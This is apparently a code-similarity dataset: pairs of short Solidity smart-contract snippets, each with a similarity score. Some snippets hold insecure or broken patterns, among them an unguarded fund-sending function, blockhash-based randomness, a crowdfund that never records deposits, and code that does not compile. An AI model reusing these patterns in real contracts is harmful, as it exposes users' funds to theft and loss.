    }
    function () public payable {}
}"
"contract Test {
    struct Interval {
        uint endpoint;
    }

    Interval[] public list;

    function addItemAndGetLengthMinusOne() public returns(uint) {
        list.push(Interval({endpoint: now}));
        uint value = list.length - 1;

        return value;
    }
}",0.5999051537734512,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract Order {

    address public owner;

    struct OrderStruct {
        address sender;
        uint amountReceived;
    }

    mapping(bytes32 => OrderStruct) orderStructs;

    event LogWithdrawal(uint amount);
    event LogOrder(address sender, bytes32 orderNumber, uint amount);

    modifier onlyOwner {
        if(msg.sender != owner) throw;
        _;
    }    

    function recordOrder(bytes32 orderNumber) payable returns(bool success) {
        if(msg.value==0) throw;
        orderStructs[orderNumber].sender = msg.sender;
        orderStructs[orderNumber].amountReceived = msg.value;
        LogOrder(msg.sender, orderNumber, msg.value);
        return true;
    }

    function getOrder(bytes32 orderNumber) constant returns(address sender, uint amount) {
        return(orderStructs[orderNumber].sender, orderStructs[orderNumber].amountReceived);
    }

    function withdrawFromContract(uint amount) onlyOwner returns(bool success) {
        if(amount > this.balance) throw; 
        if(msg.sender.send(amount)) {
            LogWithdrawal(amount);
            return true;
        } else {
            throw;
        }
    }

}",0.5979869665288833,"contract LauWarmContract {

    

    address public owner;

    mapping (address => bool) public allowed;

    mapping (address => address) public account;

    

    constructor () public {

      owner=msg.sender;

    }

	

	modifier isOwner() {

    if (msg.sender != owner) {

        emit NotOwner(msg.sender);

        return;

    }

    _; 

    }

    event NotOwner(address sender);

    event Error(address sender, address from, address to, uint amount, string mac);

    event Process(address sender, address from, address to, uint amount, string mac);

    

    function allow(address operator,address walletAddr) public isOwner{

        allowed[operator]=true;

	    account[operator]=walletAddr;

    }



    function disallow(address operator) public isOwner{

        allowed[operator]=false;

    }



    function process(address to,uint amount, string memory mac) public {

     if( allowed[msg.sender] != true )  {

      emit Error(msg.sender,account[msg.sender],to,amount,mac);

      return ;

     }

     emit Process(msg.sender,account[msg.sender],to,amount,mac);

     return ;

    }

    

   

}"
"contract TestSafeMath {
  SafeMath instance;

  constructor() public {
    instance = SafeMath(DeployedAddresses.SafeMath());
  }

  function testAdd_10_and_max_should_return_err() public {
    uint256 max = 2**256 - 1;
    bool passed = address(instance).call(bytes4(keccak256(""add(uint256,uint256)"")), 10, max);

    Assert.isFalse(passed, ""test should fail"");
  }
  function testAdd_10_and_10_should_be_ok() public {
    uint256 value = 10;
    bool passed = address(instance).call(bytes4(keccak256(""add(uint256,uint256)"")), 10, value);

    Assert.isTrue(passed, ""test should not fail"");
    Assert.equal(instance.add(10, value), value + 10, ""should be 20"");
  }
}",0.5592743310894073,"contract ERC20BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;

  uint256 public totalSupply;



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));



    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public constant returns (uint256 balance) {

    return balances[_owner];

  }



  function totalSupply() constant returns (uint256 _totalSupply) {

    return totalSupply;

  }



}"
"contract Nearest {

    using HitchensOrderStatisticsTreeLib for HitchensOrderStatisticsTreeLib.Tree;
    HitchensOrderStatisticsTreeLib.Tree tree;

    

    function insert(uint value, bytes32 key) public {
        tree.insert(key,value);
    }

    function nearest(uint search) public view returns (uint value) {
        uint rank = tree.rank(search);
        value = tree.atRank(rank);

        

        if(search != value && rank > 0) rank -= 1;
        value = tree.atRank(rank);

        
    }
}",0.5367523545076507,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract Fb {
  function fb(address a) {
     Fa b= Fa(a);
    b.fa.value(3).gas(1500)(50);
  }
}",0.5726211684140876,"contract Contract {function pegHandler( address _from, uint256 _value );}"
"contract Gracious {
  function runMe() {
    this.realWork.gas(1000000)();
  }
}",0.5210358796920023,"contract wLogoVote {
	function claimReward(address _receiver);
}"
"contract X {
    uint8[] public arr8 = [3,4,5];
    uint256[] public arr256;

    function myFunc(uint[] _arr256) public {
        arr256 = _arr256;
    }

    function proxyFunc(uint8[] _arr8) public {
        uint[] memory _arr256 = new uint[](_arr8.length);
        for (uint i = 0; i < _arr8.length; i++) {
            _arr256[i] = uint256(_arr8[i]);
        }
        myFunc(_arr256);
    }
}",0.5968412172314422,"contract test{

    uint256 public i;

    address public owner;

    

    constructor() public{

        owner = msg.sender;

    }

    

    function add(uint256 a, uint256 b) public pure returns (uint256){

        return a + b;

    }

    

    function setI(uint256 m) public {

        require(msg.sender == owner, ""owner required"");

        i = m;

    }

}"
"contract Percent {

    function getPercent(uint part, uint whole) public pure returns(uint percent) {
        uint numerator = part * 1000;
        require(numerator > part); 
        uint temp = numerator / whole + 5; 
        return temp / 10;
    }
}",0.5662412229873681,"contract SafeMath {

    function safeAdd(uint _a, uint _b) public pure returns (uint c) {

        c = _a + _b;

        require(c >= _a);

    }

    function safeSub(uint _a, uint _b) public pure returns (uint c) {

        require(_b <= _a);

        c = _a - _b;

    }

}"
"contract People {

Person[] public people;

struct Person {
    bytes32 firstName;
    bytes32 lastName;
    uint age; 
}

function addPerson(bytes32 _firstName, bytes32 _lastName, uint _age) returns (bool success) {

    Person memory newPerson;
    newPerson.firstName = _firstName;
    newPerson.lastName = _lastName;
    newPerson.age = _age;

    people.push(newPerson);
    return true;

}

function getPeople() constant returns (bytes32[],bytes32[],uint[]) {

    uint length = people.length;

    bytes32[] memory firstNames = new bytes32[](length);
    bytes32[] memory lastNames = new bytes32[](length);
    uint[] memory ages = new uint[](length);

    for(uint i = 0; i < people.length; i++) {

        
        
        

        firstNames[i] = people[i].firstName;
        lastNames[i] = people[i].lastName;
        ages[i] = people[i].age;
    }

    return (firstNames, lastNames, ages);

}",0.5558717796008587,"contract MeetupQrManager {



    using SafeMath for uint256;

    

    mapping (bytes32 => address[]) public meetups;

    string[] public names;

    

    function transfer(

        string memory name, 

        address tokenContract, 

        address account, 

        address[] memory addresses

    ) public returns(bool) {

        IERC20 token = IERC20(tokenContract);

        uint256 amount = token.allowance(account, address(this));

        

        uint256 length = addresses.length;

        uint256 total = amount.div(length);

        

        bytes32 key = keccak256(bytes(name));

        names.push(name);



        for (uint256 i=0;i<length;i++) {

            require(token.transferFrom(account, addresses[i], total));

            meetups[key].push(addresses[i]);

        }

        return true;

    }

    

    function getAddresses(string memory name) public view returns (address[] memory addresses) {

        bytes32 key = keccak256(bytes(name));

        addresses = meetups[key];

    }

    

}"
"contract Ashish {
  struct Entry {
    uint age;
    uint securityNumber;
    bool isSet;
  }

  mapping(bytes32 => Entry) myData;

  function addData(uint age, uint ssn) {
    bytes32 key = sha3(age, ssn);
    require(!myData[key].isSet);
    myData[key] = Entry(age, ssn, true);
  }
}",0.5419030972446639,"contract AirSwap {

    function fill(

      address makerAddress,

      uint makerAmount,

      address makerToken,

      address takerAddress,

      uint takerAmount,

      address takerToken,

      uint256 expiration,

      uint256 nonce,

      uint8 v,

      bytes32 r,

      bytes32 s

    ) payable {}

}"
"contract Foo2 is Foo {
    function func(uint _x) public virtual override {
        super.func(2*_x);
    }
}",0.5969381134443548,"contract rx is ERC20{

    function onTransfer(uint) public payable returns (bool);

}"
"contract TestAdoption {
 
 Adoption adoption = Adoption(DeployedAddresses.Adoption());

 
 uint expectedPetId = 8;

 
 address expectedAdopter = address(this);

 
 function testUserCanAdoptPet() public {
   uint returnedId = adoption.adopt(expectedPetId);

   Assert.equal(returnedId, expectedPetId, ""Adoption of the expected pet should match what is returned."");
 }
}",0.5127770274228208,"contract ERC721Interface {

    function ownerOf(uint256 assetId) public view returns (address);

    function safeTransferFrom(address from, address to, uint256 assetId) public;

    function isAuthorized(address operator, uint256 assetId) public view returns (bool);

    function exists(uint256 assetId) public view returns (bool);

}"
"contract Test {
    bytes32 public lastblockhashused;
    uint public lastblocknumberused;
    uint public AA;

    function Test() {
        lastblocknumberused = (block.number-1)  ;               
        lastblockhashused = block.blockhash(lastblocknumberused);
    }

    function getTest1() constant returns (uint) {
        return uint(lastblockhashused) & 0xfff;
    }

    function Test2() {
        AA = (uint(lastblockhashused) & 0xfff);
    }

    function getTest2AA() constant returns (uint) {
        return AA;
    }
}",0.5865784293026864,"contract RandomApi {
    uint64 _seed = 0;

    function random(uint64 maxExclusive) public returns (uint64 randomNumber) {
        
        _seed = uint64(keccak256(keccak256(block.blockhash(block.number - 1), _seed), block.timestamp));
        return _seed % maxExclusive;
    }

    function random256() public returns (uint256 randomNumber) {
        uint256 rand = uint256(keccak256(keccak256(block.blockhash(block.number - 1), _seed), block.timestamp));
        _seed = uint64(rand);
        return rand;
    }
}"
"contract StoreByteCode {

    function getByteCode() public view returns(bytes memory b_code){
        return at(address(this));
    }

    function at(address _addr) private view returns (bytes memory o_code) {
        assembly {
            
            let size := extcodesize(_addr)
            
            
            o_code := mload(0x40)
            
            mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            
            mstore(o_code, size)
            
            extcodecopy(_addr, add(o_code, 0x20), 0, size)
        }
    }
}",0.5645698760484137,"contract Proxy is FixedAddress {



  function () external payable {

      

      address _impl = getRegistry().getExchangeContract();



      

      

      

      

      assembly {

          let ptr := mload(0x40)

          calldatacopy(ptr, 0, calldatasize)

          let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)

          let size := returndatasize

          returndatacopy(ptr, 0, size)



          switch result

          case 0 { revert(ptr, size) }

          default { return(ptr, size) }

      }

  }



}"
"contract ContractX {
    struct Customer {
        string name;
        string license;
        
    }

    mapping (address => uint) addressIndexes;
    mapping (string => uint) licenseIndexes;
    Customer[] customers;
    uint customerCount;

    function addNewItem(address _address, string _name, string _license) public {
        customers.push(Customer(_name, _license));

        addressIndexes[_address] = customerCount;
        licenseIndexes[_license] = customerCount;

        customerCount++;
    }

    function getByAddress(address _address) public view returns(string, string) {
        return (
            customers[addressIndexes[_address]].name, 
            customers[addressIndexes[_address]].license
        );
    }

    function getByLicense(string _license) public view returns(string, string) {
        return (
            customers[licenseIndexes[_license]].name, 
            customers[licenseIndexes[_license]].license
        );
    }
}",0.5495518895407382,"contract ERC20NoReturn {

    uint256 public decimals;

    string public name;

    string public symbol;

    function totalSupply() public view returns (uint);

    function balanceOf(address tokenOwner) public view returns (uint balance);

    function allowance(address tokenOwner, address spender) public view returns (uint remaining);

    function transfer(address to, uint tokens) public;

    function approve(address spender, uint tokens) public;

    function transferFrom(address from, address to, uint tokens) public;



    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}"
"contract Mappings {

    

    struct UserStruct {
        uint balanceOf;
        bool isActive;
        mapping(uint => bool) answerFlags;
    }

    
    

    

    mapping(uint => UserStruct) public userStructs;

    
    

    mapping(uint => bool) public addressFlags;

    

    function setUserStruct(uint key, uint balanceOf, bool isActive) public returns(bool success) {
        userStructs[key].balanceOf = balanceOf;
        userStructs[key].isActive  = isActive;
        return true;
    }

    function setAddressFlag(uint key, bool flagAddress) public returns(bool success) {
        addressFlags[key] = flagAddress;
        return true;
    }

    

    function getUserAnswerFlag(uint userStructKey, uint userAnswerKey) public constant returns(bool answerFlag) {
        return userStructs[userStructKey].answerFlags[userAnswerKey];
    }

    function setUserAnswerFlag(uint userStructKey, uint userAnswerKey, bool setValue) public returns(bool success) {
        userStructs[userStructKey].answerFlags[userAnswerKey] = setValue;
        return true;
    }

}",0.5817163152311993,"contract ERC20Interface {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function burnToken(address target,uint tokens) returns (bool result);    
    function mintToken(address target, uint tokens) returns (bool result);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    
}"
"contract Loop {

    struct StudentStruct {
        uint grade;
    }
  
    mapping(address => StudentStruct) public studentStructs;
    address [] public studentList;

    event LogStudentGrade(address student, uint studentGrade);

    function appendStudentGrade(address student, uint studentGrade) public {
        studentList.push(student);
        studentStructs[student].grade = studentGrade;
    }
    
    function getStudentCount() public view returns(uint count) {
        return studentList.length;
    }
    
    function studentLoop() public {
        
        
        
        for (uint i=0; i<studentList.length; i++) {
            emit LogStudentGrade(studentList[i], studentStructs[studentList[i]].grade);
        }
    }
}",0.54759025689516,"contract IPolaris {

    struct Checkpoint {

        uint ethReserve;

        uint tokenReserve;

    }



    struct Medianizer {

        uint8 tail;

        uint pendingStartTimestamp;

        uint latestTimestamp;

        Checkpoint[] prices;

        Checkpoint[] pending;

        Checkpoint median;

    }

    function subscribe(address token) public payable;

    function unsubscribe(address token, uint amount) public returns (uint actualAmount);

    function getMedianizer(address token) public view returns (Medianizer memory);

    function getDestAmount(address src, address dest, uint srcAmount) public view returns (uint);

}"
"contract Hello {
    
    uint256[] myArray;
    
    function withdraw() external {
        uint256[2] memory blocktimes = getBlocktimes();

        for (uint256 i = 0; i < blocktimes.length; i++) {
            if (blocktimes[i] <= block.timestamp) {
                
            } else {
                myArray.push(blocktimes[i]);
            }
        }

        if (myArray.length > 0) {
            
            delete myArray;
        }
    }
    
    function getBlocktimes() private pure returns(uint256[2] memory) {
        return [uint256(10000000000),uint256(10000000000)];
    }
}",0.5646569015394657,"contract randomRange {

    function getRandom(uint256 minRan, uint256 maxRan, uint8 index, address priAddress) view internal returns(uint) {

        uint256 genNum = uint256(blockhash(block.number-1)) + uint256(priAddress) + uint256(keccak256(abi.encodePacked(block.timestamp, index)));

        for (uint8 i = 0; i < index && i < 6; i ++) {

            genNum /= 256;

        }

        return uint(genNum % (maxRan + 1 - minRan) + minRan);

    }

}"
"contract TestProxy {
    
    bytes32 private constant IMPL_ADDRESS_KEY = keccak256(""Implementation address key"");

    constructor(address _lc) public {
        setTargetAddress(_lc);
    }

    function setTargetAddress(address _address) public {
        require(_address != address(0));
        
        bytes32 implAddressStorageKey = IMPL_ADDRESS_KEY;
        address a = _address; 
        
        assembly {
            sstore(implAddressStorageKey, a)
        }
    }",0.5954637916914177,"contract ERC820Registry {

    function getManager(address addr) public view returns(address);

    function setManager(address addr, address newManager) public;

    function getInterfaceImplementer(address addr, bytes32 iHash) public view returns (address);

    function setInterfaceImplementer(address addr, bytes32 iHash, address implementer) public;

}"
"contract MyContract{
    uint256 public sqrtValue; 
    Aion aion; 
    address aionAccount; 

    function schedule_sq(uint256 number) public { 
        aion = Aion(0x10999AE703401312798EA437b02A9849fa43E5AB); 
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('sq(uint256)')),number);    
        uint callCost = 200000*1e9 + aion.serviceFee();
        uint256 txId;    
        (txId, aionAccount) = aion.ScheduleCall.value(callCost)( block.timestamp+1 day, address(this), 0, 200000, 1e9, data, true);
     }

    function sq(uint256 number) public { 
        sqValue = number**2; 
        schedule_sq(sqValue)
    } 

    function () public payable {} 
    }",0.5492245501629425,"contract iEthealSale {

    bool public paused;

    uint256 public minContribution;

    uint256 public whitelistThreshold;

    mapping (address => uint256) public stakes;

    function setPromoBonus(address _investor, uint256 _value) public;

    function buyTokens(address _beneficiary) public payable;

    function depositEth(address _beneficiary, uint256 _time, bytes _whitelistSign) public payable;

    function depositOffchain(address _beneficiary, uint256 _amount, uint256 _time) public;

    function hasEnded() public constant returns (bool);

}"
"contract NaiveSplit {

  address[4] public beneficiaryList;

  

  event LogReceived(address sender, uint amount);
  event LogSent(address beneficiary, uint amount);

  

  function FourWaySplit(address addressA, address addressB, address addressC, address addressD) {
    beneficiaryList[0]=addressA;
    beneficiaryList[1]=addressB;
    beneficiaryList[2]=addressC;
    beneficiaryList[3]=addressD;
  }

  function pay() 
    public
    payable
    returns(bool success)
  {
    if(msg.value==0) throw;

    uint forth = msg.value / 4;

    beneficiaryList[0].send(forth);
    beneficiaryList[1].send(forth);
    beneficiaryList[2].send(forth);
    beneficiaryList[3].send(forth);
    LogReceived(msg.sender, msg.value);
    LogSent(beneficiaryList[0], forth);
    LogSent(beneficiaryList[1], forth);
    LogSent(beneficiaryList[2], forth);
    LogSent(beneficiaryList[3], forth);
    return true;
  }
}",0.5942703493321457,"contract Escrow is Ownable {
    using SafeERC20 for IERC20;

    event BeneficiaryUpdated(address beneficiary);
    event TokensWithdrawn(address beneficiary, uint256 amount);

    IERC20 public token;
    address public beneficiary;

    constructor(IERC20 _token) public {
        token = _token;
    }

    
    
    
    function setBeneficiary(address _beneficiary) public onlyOwner {
        beneficiary = _beneficiary;
        emit BeneficiaryUpdated(beneficiary);
    }

    
    
    
    function withdraw() public {
        require(beneficiary != address(0), ""Beneficiary not assigned"");
        require(msg.sender == beneficiary, ""Caller is not the beneficiary"");

        uint256 amount = token.balanceOf(address(this));
        require(amount > 0, ""No tokens to withdraw"");

        token.safeTransfer(beneficiary, amount);
        emit TokensWithdrawn(beneficiary, amount);
    }
}"
"contract MappingArrayOfStructs is Test {

  struct Review {
    uint rating;
    address reviewer;
    string description;
    uint dateAdded;
  }

  mapping (uint => Review[]) ratings;

  function testMappingArrayOfStructs() {
    
    ratings[0].push(Review({
      rating: 0,
      reviewer: msg.sender,
      description: """",
      dateAdded: now
    }));
    
  }

}",0.5319198764037039,"contract s_Form001 {
    
    mapping (bytes32 => string) data;
    
    address owner;
    
    function s_Form001() {
        owner = msg.sender;

    }
    
    function setData(string key, string value) {
        require(msg.sender == owner);
        data[sha3(key)] = value;
    }
    
    function getData(string key) constant returns(string) {
        return data[sha3(key)];
    }


}"
"contract Derived is Base {
  function Derived(uint _bar) Base(_bar * 2) {}
}",0.5783366460884884,"contract BurnableErc20 is ERC20 {

    function burn(uint value) external;

}"
"contract Trading {

    address receivingAccount;
    uint deadline;

    struct Asset {
        string name;
        uint price;
        uint barcode;
    }

    struct Stock {
        Asset asset;
        uint count;
    }

    struct Vendor {
        string name;
        address account;
        Stock[] stocks;
    }

    Asset[] assets;
    Vendor[] vendors;

    
    function Trading(address _vendor0, address _vendor1) {
        
        assets[0] = Asset(""Asset0"", 12, 1234);
        Asset memory asset1 = Asset(""Asset1"", 34, 5678);
        assets[1] = asset1;

        
        Vendor memory vendor0 = Vendor(""Vendor0"", _vendor0, new Stock[](5));
        Vendor memory vendor1 = Vendor(""Vendor1"", _vendor1, new Stock[](5));

        
        vendor0.stocks[0] = Stock(assets[0], 2);
        vendor0.stocks[1] = Stock(asset1, 2);

        
        vendor1.stocks[0] = Stock(assets[0], 1);
        vendor1.stocks[1] = Stock(asset1, 1);

        
        deadline = now + 10 * 1 minutes;
    }   

    function listAssets() public returns (uint[]) {
        uint[] memory barcodes = new uint[](assets.length);
        for (uint i=0; i<assets.length; i++) {
            barcodes[i] = assets[i].barcode;
        }
        return barcodes;
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function dispose() afterDeadline {
        suicide(receivingAccount);
    }
}",0.5370226089805045,"contract COS is ERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor () public {
        _name = ""COS"";
        _symbol = ""COS"";
        _decimals = 18;
        _totalSupply = 200e6 * 10**18; 
        
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(this), msg.sender, _totalSupply);
    }

    
    function airdrop(address[] calldata _recipients, uint256[] calldata _values) external returns (bool) {
        require(_recipients.length == _values.length, ""Inconsistent data lengths"");
        uint256 senderBalance = _balances[msg.sender];
        uint256 length = _values.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 value = _values[i];
            address to = _recipients[i];
            require(senderBalance >= value, ""Insufficient Balance"");
            require(to != address(0), ""Address is Null"");
            if (msg.sender != _recipients[i])  {      
                transfer(to, value);
            }
        }
        return true;            
    }

    

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract B{
    uint res;
    A objOfA;
    function B(address _addressOfContractA){
      objOfA = A(_addressOfContractA);
    }
    function call_double(uint val) {
      res = objOfA.double(val);
    }
}",0.594057241077278,"contract FcfInterface {
    function balanceOf(address) public pure returns (uint) {}
    function transferFrom(address, address, uint) public pure returns (bool) {}
}"
"contract Arraytest{

    uint8[] public array ;

    constructor() public{
        for(uint8 counter=0; counter<2; counter++)
        {
            array.push(counter);
        }
    }

    event MESSAGE(uint _message);

    function reduceLength() public returns (uint8[] memory) {


            array.length--;
            emit MESSAGE(array.length);
            return array;



        
        

        

        

        

        

        

        

}

}",0.579015607324966,"contract CappedToken is MintableToken {

    uint256 public cap;

    constructor(uint256 _cap) public {
        require(_cap > 0);
        cap = _cap;
    }

    
    function mint(
        address _to,
        uint256 _amount
    )
    public
    returns (bool)
    {
        require(totalSupply_.add(_amount) <= cap);

        return super.mint(_to, _amount);
    }

}"
"contract TransportContracts{
     uint counter;
     uint temperatureBond;

     event newTransport(uint counter);

     function defineTransport (uint _temperatureBond) public {
         counter++;
         temperatureBond = _temperatureBond;
         emit newTransport(counter);}}",0.5198028004389907,"contract Test {

    event testLog(address indexed account, uint amount);

    

    constructor() public {

        emit testLog(msg.sender, block.number);

    }

    

    function execute(uint number) public returns (bool) {

        emit testLog(msg.sender, number);

        return true;

    }

}"
"contract DataStore{
    struct DataModel {
        uint id;
        bytes32 string1;
        bytes32 string2;
        bytes32 string3;
        uint actorId;
        bytes32 string4;
        bytes32 string5;
        bytes32 string6;
        bytes32 string7;
    }

    mapping(bytes32 => DataModel) dataMapping;
    address owner;

    function DataStore() {
        owner = msg.sender;
    }

    function storeData(bytes32 hash, uint id, bytes32 string1, bytes32 string2, 
      bytes32 string3, uint actorId, bytes32 string4, bytes32 string5, 
      bytes32 string6, bytes32 string7) returns (bool response) {
        if (msg.sender != owner) {
            return false;
        } else {
            DataModel memory datamodel;
            datamodel.id = id;
            datamodel.string1 = string1;
            datamodel.string2 = string2;
            datamodel.string3 = string3;
            datamodel.actorId = actorId;
            datamodel.string4 = string4;
            datamodel.string5 = string5;
            datamodel.string6 = string6;
            datamodel.string7 = string7;
            dataMapping[hash] = datamodel;
            return true;
        }
    }

    function queryData(bytes32 hash) constant returns (uint, bytes32, bytes32, 
      bytes32, uint, bytes32, bytes32, bytes32, bytes32) {
        if (msg.sender != owner) {
            throw;
        }
        DataModel memory model = dataMapping[hash];
        return (model.id, model.string1, model.string2, model.string3, 
          model.actorId, model.string4, model.string5, model.string6, 
          model.string7);
    }
}",0.5205524371063787,"contract Sign {

	address public AddAuthority;	
	mapping (uint32 => bytes32) Cert;	
	
	event EventNotarise (address indexed Signer, bytes Donnees_Signature, bytes Donnees_Reste);

	
	
	function Sign() {AddAuthority = msg.sender;}

	function () {throw;} 
	
	function destroy() {if (msg.sender == AddAuthority) {selfdestruct(AddAuthority);}}
	
	function SetCert (uint32 _IndiceIndex, bytes32 _Cert) {
		Cert [_IndiceIndex] = _Cert;
	}				
	
	function GetCert (uint32 _IndiceIndex) returns (bytes32 _Valeur)  {
		_Valeur = Cert [_IndiceIndex];
	}		
	

 	

	function VerifSignature (bytes _Signature, bytes _Reste) returns (bool) {
		
		
		
		bytes32 r;
		bytes32 s;
		uint8 v;
		bytes32 hash;
		address Signer;
        assembly {
            r := mload(add(_Signature, 32))
            s := mload(add(_Signature, 64))
            
            v := and(mload(add(_Signature, 65)), 255)
            hash := mload(add(_Reste, 32))
            Signer := mload(add(_Reste, 52))
        }		
		return Signer == ecrecover(hash, v, r, s);
	}
	
	function VerifCert (uint32 _IndiceIndex, bool _log, bytes _Signature, bytes _Reste) returns (uint status) {					
		status = 0;
		
		if (Cert [_IndiceIndex] != 0) {
			status = 1;
			
			if (VerifSignature (_Signature, _Reste)) {
				
				address Signer;
				assembly {Signer := mload(add(_Reste, 52))}		
			} else {
				
				status = 2;							
			}		
			
			if (_log) {
				EventNotarise (Signer, _Signature, _Reste);
				status = 3;							
			}
		}
		return (status);
	}
	
}"
"contract myFirstContract
{
    address[] public childContracts;
    uint public idd;
    string public name1;

    function newContracts(uint _id,string _name) public returns(address _newContract)
    {
        uint id=_id;
        string memory name=_name;
        anotherContract a = new anotherContract(id,name);
        childContracts.push(a);
        return a;
    }

    function getContractData(uint _address) public view returns(uint, string)
    {
        anotherContract anotherContractInstance = anotherContract(_address);
        return (anotherContractInstance.getId(), anotherContractInstance.getName());
    }
}",0.5636214777919657,"contract WhoVote {

    mapping (address => bytes32) public voteHash;
    address public parentContract;
    uint public deadline;

    modifier isActive {
        require(now < deadline);
        _;
    }

    modifier isParent {
        require(msg.sender == parentContract);
        _;
    }

    function WhoVote(address _parentContract, uint timespan) public {
        parentContract = _parentContract;
        deadline = now + timespan;
    }

    
    function recieveVote(address _sender, bytes32 _hash) public isActive isParent returns (bool) {
        require(voteHash[_sender] == 0);
        voteHash[_sender] = _hash;
        return true;
    }


}"
"contract test{
    uint[] array = [1,2,3,4,5];
    function remove(uint index)  returns(uint[]) {
        if (index >= array.length) return;

        for (uint i = index; i<array.length-1; i++){
            array[i] = array[i+1];
        }
        delete array[array.length-1];
        array.length--;
        return array;
    }
}",0.5887674393224609,"contract Common {
    
    function Common() internal {

    }

    function getIndexOfTarget(address[] list, address addr) internal pure returns (int) {
        for (uint i = 0; i < list.length; i++) {
            if (list[i] == addr) {
                return int(i);
            }
        }
        return -1;
    }
}"
"contract test{

    struct mStruct {
        string message;
        address sender;
        uint balance;
    }

    function testme() public pure returns(bytes32) {

        mStruct memory message = mStruct(""Receiver closing signature"", 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c, 100);
        return keccak256(abi.encode(message.message, message.sender, message.balance));
    }
}",0.5480780894069536,"contract TerraNullius {
  struct Claim { address claimant; string message; uint block_number; }
  Claim[] public claims;

  function claim(string message) {
    uint index = claims.length;
    claims.length++;
    claims[index] = Claim(msg.sender, message, block.number);
  }

  function number_of_claims() returns(uint result) {
    return claims.length;
  }
}"
"contract Bank{       

    address public owner;
    uint public receivedWei;
    uint public returnedWei;

    

    struct Client {
        uint received;
        uint returned;
        uint clientListPointer;
    }

    mapping(address => Client) public clientStructs;
    address[] public clientList;

    event LogReceivedFunds(address sender, uint amount);
    event LogReturnedFunds(address recipient, uint amount);

    function Bank() {
        owner = msg.sender;
    }

    function getClientCount()
        public 
        constant
        returns(uint clientCount)
    {
        return clientList.length;
    }

    function isClient(address client)
        public
        constant
        returns(bool isIndeed)
    {
        if(clientList.length==0) return false;
        return clientList[clientStructs[client].clientListPointer]==client;
    }

    function pay() payable 
        public
        returns(bool success)
    {
        
        if(!isClient(msg.sender)) {
            clientStructs[msg.sender].clientListPointer = clientList.push(msg.sender)-1;
        }
        
        clientStructs[msg.sender].received += msg.value;
        receivedWei += msg.value;
        LogReceivedFunds(msg.sender, msg.value);
        return true;
    }

    function payMeBack(uint amountToWithdraw) 
        public
        returns(bool success)
    {
        
        if(!isClient(msg.sender)) throw;

        
        uint netOwed = clientStructs[msg.sender].received - clientStructs[msg.sender].returned;

        
        if(amountToWithdraw > netOwed) throw;

        

        
        
        clientStructs[msg.sender].returned += amountToWithdraw;

        
        returnedWei += amountToWithdraw;
        LogReturnedFunds(msg.sender, amountToWithdraw);
        if(!msg.sender.send(amountToWithdraw)) throw;
        return true;
    }
}",0.5976793982968113,"contract Crowdfund is Owned {

     using SafeMath for uint;

     

    

    mapping(address => uint256) public Holdings;

    mapping(uint256 => address) public ContributorsList;

    uint256 listPointer;

    uint256 totalethfunded;

    mapping(address => bool) public isInList;

    bool crowdSaleOpen;

    bool crowdSaleFail;

    uint256 CFTsToSend;

    

    constructor() public{

        crowdSaleOpen = true;

    }

    

    modifier onlyWhenOpen() {

        require(crowdSaleOpen == true);

        _;

    }

    function amountOfCFTtoSend(address Holder)

        view

        public

        returns(uint256)

    {

        uint256 amount = CFTsToSend.mul( Holdings[Holder]).div(1 ether).div(totalethfunded);

        return ( amount)  ;

    }

    function setAmountCFTsBought(uint256 amount) onlyOwner public{

        CFTsToSend = amount;

    }

    function() external payable onlyWhenOpen {

        require(msg.value > 0);

        Holdings[msg.sender].add(msg.value);

        if(isInList[msg.sender] == false){

            ContributorsList[listPointer] = msg.sender;

            listPointer++;

            isInList[msg.sender] = true;

        }

    }

    function balanceToOwner() onlyOwner public{

        require(crowdSaleOpen == false);

        totalethfunded = address(this).balance;

        owner.transfer(address(this).balance);

    }

    function CloseCrowdfund() onlyOwner public{

        crowdSaleOpen = false;

    }

    function failCrowdfund() onlyOwner public{

        crowdSaleFail = true;

    }

    function retreiveEthuponFail () public {

        require(crowdSaleFail == true);

        require(Holdings[msg.sender] > 0);

        uint256 getEthback = Holdings[msg.sender];

        Holdings[msg.sender] = 0;

        msg.sender.transfer(getEthback);

    }

}"
"contract Music is owned{

    string public themeMusic;
    string public idMusic;
    int public money;

    function Music() {
    
    }
    function Car (string setThemeMusic, string setIdMusic, uint setmoney) {
        themeMusic = setThemeMusic;
        idMusic = setIdMusic;
        money = setmoney;
    }

    function setMoney(uint moneyUpdate) onlyOwner {
        money = moneyUpdate;
    }",0.5807458524364872,"contract SaveData {
    mapping (uint => string) sign;
    address public owner;
    event SetString(uint key,string types);
    function SaveData() public {
        owner = msg.sender;
    }
    function setstring(uint key,string md5) public returns(string){
